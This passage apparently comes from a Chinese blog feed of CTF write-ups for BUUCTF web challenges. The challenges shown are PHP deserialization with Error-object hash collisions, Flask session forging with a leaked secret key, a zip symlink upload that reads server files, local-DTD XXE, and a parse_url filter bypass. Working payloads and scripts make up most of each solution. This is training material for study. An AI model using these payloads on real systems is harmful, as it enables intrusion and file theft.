punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"md5 success"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"sha1 success"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>测试结果<br><code>$a = new Error(&quot;llnn&quot;,1);</code>和<code>$b = new Error(&quot;llnn&quot;,2);</code>不在一行的话<code>md5</code>和<code>sha1</code>是不等的 </p><p><img src="https://s3.bmp.ovh/imgs/2021/09/565130a04e84fd98.png">      </p><p>而且<code>llnn</code>那里，也就是Error类的第一个参数是可控的，所以可以这样：<code>?&gt;&lt;?=phpinfo();?&gt;</code>但有过滤，小括号和<code>/</code>都不能用，可以直接<code>include /flag</code>;将<code>/flag</code>url编码取反绕过</p><pre><code>php &gt; echo urlencode(~&#39;/flag&#39;);%D0%99%93%9E%98php &gt; echo ~urldecode(&#39;%D0%99%93%9E%98&#39;);/flag</code></pre><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">SYCLOVER</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$syc</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$lover</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"?>&lt;?=include~"</span><span class="token punctuation">.</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"%D0%99%93%9E%98"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"?>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SYCLOVER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">syc</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lover</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SWPU2019 Web3</title>
    <link href="/2021/09/05/BUU92/"/>
    <url>/2021/09/05/BUU92/</url>
    
    <content type="html"><![CDATA[<h2 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2><p>打开环境<br><img src="https://s3.bmp.ovh/imgs/2021/09/30ed24f91e126fbf.png"><br>随便登个admin  admin<br><img src="https://s3.bmp.ovh/imgs/2021/09/e5c98883e53ffd6e.png"><br>点击<code>upload</code>会得到<code>Permission denied!</code><br>注意到网站标题是<code>CTF-Flask-Demo</code>,所以去解一下session<br>解密脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># flask-session-cookie-manager-master  也能解session</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> zlib<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> session_json_serializer<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token keyword">def</span> <span class="token function">decryption</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token punctuation">,</span> sig <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    payload<span class="token punctuation">,</span> timestamp <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    decompress <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        decompress <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not base64 decode the payload because of '</span>                         <span class="token string">'an exception'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> decompress<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            payload <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not zlib decompress the payload before '</span>                             <span class="token string">'decoding the payload'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> session_json_serializer<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>decryption<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><pre><code>PS D:\Users\L--N\Desktop\FILES\py\some&gt; python session_de.py .eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFxjxhY.YTTKww.1GFMAbE2U50IAvkhmpCtlVyULYg&#123;&#39;id&#39;: b&#39;100&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;</code></pre><p>之后伪造cookie,让id为<code>b&#39;1&#39;</code>,需要key</p><p>然后，如果访问网站不存在的路由会返回<code>404 not found</code>但status是200，在响应头里有：<code>Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==</code></p><p>base64解码后得到：<code>SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</code>    </p><p>然后用<code>flask-session-cookie-manager</code>加密即可</p><pre><code>PS D:\Users\L--N\Desktop\FILES\flask-session-cookie-manager-master&gt; python .\flask_session_cookie_manager3.py encode -s &#39;keyqqqwwweee!@#$%^&amp;*&#39; -t &quot;&#123;&#39;id&#39;: b&#39;1&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;&quot;.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.YTTLwQ.WmaEwPJAp37kCXwjJt6tSxM9prM</code></pre><p><code>/upload</code>页面更换cookie</p><p><img src="https://s3.bmp.ovh/imgs/2021/09/a488570f16605e2e.png">    </p><p>得到文件上传的页面，且注释中有源码</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">b'1'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method<span class="token operator">==</span><span class="token string">'POST'</span><span class="token punctuation">:</span>        m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        name <span class="token operator">=</span> name<span class="token operator">+</span><span class="token string">'qweqweqwe'</span>        name <span class="token operator">=</span> name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        m<span class="token punctuation">.</span>update<span class="token punctuation">(</span>name<span class="token punctuation">)</span>        md5_one<span class="token operator">=</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        n <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>        ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr        ip <span class="token operator">=</span> ip<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        n<span class="token punctuation">.</span>update<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        md5_ip <span class="token operator">=</span> n<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        f<span class="token operator">=</span>request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>        basepath<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> basepath<span class="token operator">+</span><span class="token string">'/upload/'</span><span class="token operator">+</span>md5_ip<span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>md5_one<span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"/"</span>        path_base <span class="token operator">=</span> basepath<span class="token operator">+</span><span class="token string">'/upload/'</span><span class="token operator">+</span>md5_ip<span class="token operator">+</span><span class="token string">'/'</span>        filename <span class="token operator">=</span> f<span class="token punctuation">.</span>filename        pathname <span class="token operator">=</span> path<span class="token operator">+</span>filename        <span class="token keyword">if</span> <span class="token string">"zip"</span> <span class="token operator">!=</span> filename<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'zip only allowed'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>pathname<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                f<span class="token punctuation">.</span>save<span class="token punctuation">(</span>pathname<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            cmd <span class="token operator">=</span> <span class="token string">"unzip -n -d "</span><span class="token operator">+</span>path<span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span> pathname            <span class="token keyword">if</span> cmd<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> cmd<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>waf<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'error'</span>        unzip_file <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>pathname<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>        unzip_filename <span class="token operator">=</span> unzip_file<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'is_login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'not login'</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> unzip_filename<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>                os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>            image <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token operator">+</span>unzip_filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>image<span class="token punctuation">)</span>            resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/png'</span>            <span class="token keyword">return</span> resp        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">'error'</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/showflag'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">showflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token boolean">True</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>        image <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'./flag/flag.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>image<span class="token punctuation">)</span>        resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/png'</span>        <span class="token keyword">return</span> resp    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"can't give you"</span></code></pre><p>两个路由，第一个要求上传个图片压缩包，第二个说明flag在flask根目录下的flag里的flag.jpg中</p><p><code>showflag()</code>路由的<code>True==False</code>是恒<code>False</code>的，所以不能通过第二个路由拿到flag，这里通过第一个路由上传个软链接读取文件      </p><p><code>ln -s</code>是Linux的一种软连接，相当于Windows的快捷方式<br>比如</p><pre><code>┌──(root💀kali)-[~/桌面]└─# ln -s /etc/passwd test       </code></pre><p>打开<code>test</code>中就是<code>/etc/passwd</code>中的内容了        </p><p><code>/proc/self</code> 记录了系统运行的信息状态等,<code>cwd</code>指向当前进程运行目录的一个符号链接,即flask运行进程目录      </p><p>payload:   </p><pre><code>┌──(root💀kali)-[~]└─# ln -s /proc/self/cwd/flag/flag.jpg test┌──(root💀kali)-[~]└─# zip -ry test.zip test</code></pre><p>然后将<code>test.zip</code>上传即可得到flag<br><img src="https://s3.bmp.ovh/imgs/2021/09/f2435ead4e20cf6f.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>flask</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>flask</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bnv</title>
    <link href="/2021/08/01/BUU91/"/>
    <url>/2021/08/01/BUU91/</url>
    
    <content type="html"><![CDATA[<h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/08/5a5f87e50976a9cd.png"><br><code>submit</code>抓包   </p><pre><code>POST /api/search HTTP/1.1Host: c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-type: application/jsonContent-Length: 38Origin: http://c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cnConnection: closeReferer: http://c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cn/&#123;&quot;message&quot;:&quot;135601360123502401401250&quot;&#125;       </code></pre><p><code>json</code><br>尝试sqli，不行<br>有json的地方可能存在<code>xxe</code><br><code>Content-type</code>改为<code>application/xml</code>   </p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ELEMENT message (#PCDATA)&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;message&gt;&amp;xxe;&lt;/message&gt;</code></pre><p>返回<code>No result found</code>     </p><p>看来不行    </p><p>WP：</p><p><a href="https://www.dazhuanlan.com/xlllovelife/topics/1220539"><code>利用本地DTD文件进行XXE</code></a>       </p><p>payload:</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message[    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;    &lt;!ENTITY % ISOamso &#39;    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;    &amp;#x25;eval;    &amp;#x25;error;&#39;&gt;%local_dtd;]&gt;</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>xxe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Eating_cms</title>
    <link href="/2021/08/01/BUU90/"/>
    <url>/2021/08/01/BUU90/</url>
    
    <content type="html"><![CDATA[<h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><h4 id="parse-url-解析漏洞"><a href="#parse-url-解析漏洞" class="headerlink" title="parse_url()解析漏洞"></a><code>parse_url()</code>解析漏洞</h4><ul><li><p><code>function.php</code>中</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">"flag"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"manage"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ffffllllaaaaggg"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><code>http://675a4ec5-c964-4b92-a667-7415df780f0f.node4.buuoj.cn/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code></p><p>这样就会被匹配到，不能读取；但是如果这样<code>///user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code>parse_url就会返回<code>false</code>；读取成功。</p><p><img src="https://ftp.bmp.ovh/imgs/2021/08/777d762da5a7bc08.png"></p><p><strong>漏洞问题只存在于php5.4.7以前</strong></p><hr><p>真正的上传地址<code>http://675a4ec5-c964-4b92-a667-7415df780f0f.node4.buuoj.cn/user.php?page=m4aaannngggeee</code></p><pre class="language-php" data-language="php"><code class="language-php">//upllloadddd.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$allowtype</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"gif"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"png"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error:can not move"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error:not an upload file！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$newfile</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"file upload success&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token variable">$picdata</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">" | base64 -w 0"</span><span class="token punctuation">)</span><span class="token 